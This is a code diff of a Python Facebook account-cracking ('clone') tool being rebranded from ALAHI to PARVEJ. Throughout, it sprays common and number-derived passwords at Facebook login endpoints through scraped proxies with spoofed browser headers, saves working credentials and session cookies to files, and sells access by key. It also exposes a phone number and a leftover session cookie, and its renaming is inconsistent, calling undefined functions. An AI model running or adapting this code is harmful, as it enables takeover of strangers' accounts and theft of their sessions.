@@ -98,7 +98,7 @@ try:
 	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(prox) 
 except Exception as e:
-	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[ALAHI-XD')
+	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[PARVEJ-XD')
 prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
 	a='Mozilla/5.0 (Symbian/3; Series60/'
@@ -214,52 +214,47 @@ else:
     a = ltx
     tag = "\x1b[1;96mAM"
 
-def _ALAHI_(u):
+def _PARVEJ_(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.000)
         
 
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
 	print(f"""\033[1;32m
-
-                      
-            
-           
-       
-       
-              
-                    
-                           
-                             
-                                       
+d8888b.  .d8b.  d8888b. db    db d88888b    d88b 
+88  `8D d8' `8b 88  `8D 88    88 88'        `8P' 
+88oodD' 88ooo88 88oobY' Y8    8P 88ooooo     88  
+88~~~   88~~~88 88`8b   `8b  d8' 88~~~~~     88  
+88      88   88 88 `88.  `8bd8'  88.     db. 88  
+88      YP   YP 88   YD    YP    Y88888P Y8888P  
                    
 \033[1;91m--------------------------------------------
-\033[1;91m[*] CREATOR   > ALAHI
-\033[1;91m[*] FACEBOOK  > Fazla alahi
-\033[1;91m[*] GITHUB    > FUCK-XXX
+\033[1;91m[*] CREATOR   > PARVEJ
+\033[1;91m[*] FACEBOOK  > FH ROMAN
+\033[1;91m[*] GITHUB    > ROMAN-XXX
 \033[1;91m[*] VERSION   > FREE
-\033[1;91m[*] WHATSAPP  > +8801*******
+\033[1;91m[*] WHATSAPP  > +8801608002168
 \033[1;91m-------------------------------------------"""  )
 
 
 def menu():
 	os.system('clear')
 	banner()
-	_ALAHI_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
-	_ALAHI_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
-	_ALAHI_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
-	_ALAHI_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
-	_ALAHI_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
-	_____ALAHI_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
-	if _____ALAHI_____ in ['1']:
+	_SAMIR_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
+	_SAMIR_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
+	_SAMIR_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
+	_SAMIR_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
+	_SAMIR_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
+	_____SAMIR_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
+	if _____SAMIR_____ in ['1']:
 		C1()
-	if _____ALAHI_____ in ['2']:
+	if _____SAMIR_____ in ['2']:
 		Y2()
-	if _____ALAHI_____ in ['3']:
+	if _____SAMIR_____ in ['3']:
 		BER()
-	if _____ALAHI_____ in ['4']:
+	if _____SAMIR_____ in ['4']:
 		os.system("xdg-open https://www.facebook.com/profile.php?id=100086442349803 ")
-	if _____ALAHI_____ in ['0']:
+	if _____SAMIR_____ in ['0']:
 		exit()
 	
 		
@@ -362,7 +357,7 @@ def Settings():
 def passwrd():
 	os.system('clear')
 	banner()
-	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(ALAHI_NAME))
+	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(SAMIR_NAME))
 	print(f"\033[1;92m[\033[1;92m\033[1;32m\033[1;92m] TOTAL ID       \033[1;34m: \033[0;92m"+str(len(id)))
 	print(f"\033[1;92m[\033[1;92m\033[1;32m\033[1;92m] START TIME     \033[1;34m: \033[0;96m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
 	print(f"\033[1;92m[\033[1;92m\033[1;32m\033[1;92m] START DATE     \033[1;34m: \033[0;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta} ")
@@ -427,7 +422,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{bo} [ALAHI] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
+	sys.stdout.write(f"\r{bo} [PARVEJ] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -444,7 +439,7 @@ def crack(idf,pwv):
 			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r\x1b[1;91m [\033[1;91mALAHI-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
+				print(f'\r\x1b[1;91m [\033[1;91mPARVEJ-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -452,9 +447,9 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [\033[1;92mALAHI-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
+				print(f'\r\x1b[1;92m [\033[1;92mPARVEJ-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
 				cek_apk(session,coki)
-				open('/sdcard/ALAHI-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('/sdcard/PARVEJ-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
 				akun.append(idf+'|'+pw)
 				break
 				
@@ -488,7 +483,7 @@ def Y2():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    with ThreadPool(max_workers=50) as ALAHI:
+    with ThreadPool(max_workers=50) as PARVEJ:
         clear()
         tl = str(len(user))      
         print(f"\033[1;92m[\033[1;32m\033[1;92m]\033[0;92m NAME           \033[1;34m: \033[0;92m"+name)
@@ -500,7 +495,7 @@ def Y2():
         for love in user:
             pwv = [love,love[2:],love[1:],code+love,code+love[:3],'bangladesh','khan123','11223344','freefire']
             uid = code+love
-            ALAHI.submit(ALAHI,uid,pwv,tl)
+            PARVEJ.submit(PARVEJ,uid,pwv,tl)
     print(' CRACK PROCESS HAS BEEN COMPLETED ')
     
     
@@ -556,15 +551,15 @@ def rcerek(uid,pwx,tl):
         	header_freefb = {"authority": 'mbasic.facebook.com',
             'method': 'GET',
             'scheme': 'https', 
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'sec-ch-ua': '"(Not)A;Brand";v="24", "Chromium";v="116"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Opera";v="96"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"macOS"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'cross-site',
+            'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent':pro}
@@ -574,23 +569,23 @@ def rcerek(uid,pwx,tl):
         	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
         	    cid = coki[151:166]
         	    print ('')
-        	    print('\033[1;92m[\033[1;92mALAHI-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
+        	    print('\033[1;92m[\033[1;92mPARVEJ-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
         	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
         	    cek_apk(session,coki)
-        	    open('/sdcard/ALAHI-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
+        	    open('/sdcard/PARVEJ-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
         	    oks.append(uid)
         	    break 
         	else:
         	    continue
         loop+=1
-        sys.stdout.write('\r%s[ALAHI-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r%s[PARVEJ-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
 	
     except:
      pass
 
 
-def ALAHI(uid,pwv,tl):
+def SAMIR(uid,pwv,tl):
     global loop
     global cps
     global oks
@@ -614,16 +609,16 @@ def ALAHI(uid,pwv,tl):
             header_freefb = {"authority": 'mbasic.facebook.com',
             'method': 'GET',
             'scheme': 'https', 
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-language': 'en-BD,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
             'cache-control': 'max-age=0',
-            # 'cookie': 'datr=7i9FZfB4lBkOrFK78-Wiojt2; sb=7i9FZdj5E9tOsaSkgLvhmKeG; locale=en_GB; vpd=v1%3B750x400x1.8000000715255737; m_pixel_ratio=1.8000000715255737; wd=400x750; fr=0XTOvazWqz8SsAo8H..BlRS_u.iN.AAA.0.0.BlSGz2.AWX8GRWliXQ',
-            'sec-ch-ua': '"(Not)A;Brand";v="24", "Chromium";v="116"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            # 'cookie': 'datr=fBUAZGGo-zMzoZjvnOPMeaNz; sb=fBUAZGpDUevpF5cTHSS8f8v7; zsh=ASQEMcVxs1Zu4umLrmv5bi5cdHTvtE6cX5t1nR70Zx6TTzg42yQdiyV5yQaeiFC-Yc9w5_n2IyawhKuazcDFoQ-I4ME-3rqn62nPOIm211zbCUljOP-p6BME9mqEd0JnSW0DsyQTS2O-MyMpMrD6oKDgKf6B-eOe85tMxbq_i30PVJOcwti4BNGvn0Hj2DoycBje20B0gy6Q6Ctbki4vogOKtmkDnBGoru_-LKLx9kF-STlYrv2Oo-IHKgnIaGJXOOixrXv0icu-Y1e-XogPkMzzdy1n6_I6_qA2jxZhiMwT2hCZG4FBFjAJZ_AmSTjgy47Vy0Lks2E9bV8-; m_pixel_ratio=2; wd=360x806; fr=0bqgIuM91Owb0Yk1O..BkABV8.W2.AAA.0.0.BkAf8X.AWWVwHU9NPA',
+            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="111", "Opera";v="96"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'cross-site',
+            'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent':pro}
@@ -633,22 +628,22 @@ def ALAHI(uid,pwv,tl):
         	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
         	    cid = coki[151:166]
         	    print ('')
-        	    print('\033[1;92m[\033[1;92mALAHI-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
+        	    print('\033[1;92m[\033[1;92mPARVEJ-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
         	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
         	    cek_apk(session,coki)
-        	    open('/sdcard/ALAHI-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
+        	    open('/sdcard/PARVEJ-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
         	    oks.append(uid)
         	    break 
             else:
         	    continue
         loop+=1
-        sys.stdout.write('\r%s[ALAHI-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r%s[PARVEJ-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
 
 def mex():
-    imt = '=ALAHI=XD='
+    imt = '=PARVEJ=XD='
     os.system('clear')
     banner()   
     try:
@@ -668,9 +663,9 @@ def mex():
         kok.close()
         print ('')
         input('   \x1b[0;34mENTER TO BUY TOOLS ')
-        os.system('am start https://wa.me/+8801608002168?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20ALAHI%20Paid%20Tools.%20My%20Key:%20'+key1)
+        os.system('am start https://wa.me/+8801608002168?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20PARVEJ%20Paid%20Tools.%20My%20Key:%20'+key1)
         mex()
-    r = requests.get('https://github.com/KIN-NINJA/Gift/blob/main/Gift.txt').text
+    r = requests.get('https://wa.me/+8801608002168/PARVEJ/approved.txt/main/approved.%20txt').text
     if key1 in r:
         print("\33[1;32mYour Token is Successfully Approved")
         time.sleep(0.5)
@@ -688,7 +683,7 @@ def mex():
         print ('\x1b[0;34mIF YOU BUY TOOLS CONTACT ME')
         print ('')
         input('\033[1;92mIf you want to buy presh entero ')
-        os.system('am start https://wa.me/+88016*******?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20ALAHI%20Paid%20Tools.%20My%20Key:%20'+key1)
+        os.system('am start https://wa.me/+8801608002168?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20PARVEJ%20Paid%20Tools.%20My%20Key:%20'+key1)
         mex()
 ##################
 
